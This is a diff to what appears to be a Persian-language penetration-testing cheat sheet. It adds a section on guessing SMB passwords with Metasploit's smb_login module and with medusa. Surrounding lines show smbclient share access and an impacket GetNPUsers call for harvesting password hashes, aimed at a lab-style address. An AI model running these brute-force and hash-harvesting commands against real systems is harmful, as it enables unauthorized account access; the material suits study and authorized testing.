@@ -1374,17 +1374,36 @@ smbclient -L 10.10.10.10
 smbclient //10.10.10.10/forensic
 ```
 
-## ورود به شل
+### ورود به شل
 
 ```text
 smbclient //10.10.10.10/profiles$
 ```
 
-## دریافت کاربران به همراه هش کلمه عبور
+### دریافت کاربران به همراه هش کلمه عبور
 
 ```text
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py 10.10.10.10L -usersfile
 ```
+
+### حدس کلمه عبور های مختلف smb
+
+#### با metasploit
+
+```text
+msf5 > use auxiliary/scanner/smb/smb_login
+set pass_file wordlist
+set USER_file users.txt
+set RHOSTS 10.10.10.10
+run
+```
+
+#### با medusa
+
+```text
+medusa -h 10.10.10.10 -U users.txt -P wordlist -M smbnt
+```
+
 
 ## دستورات rpcclient
 
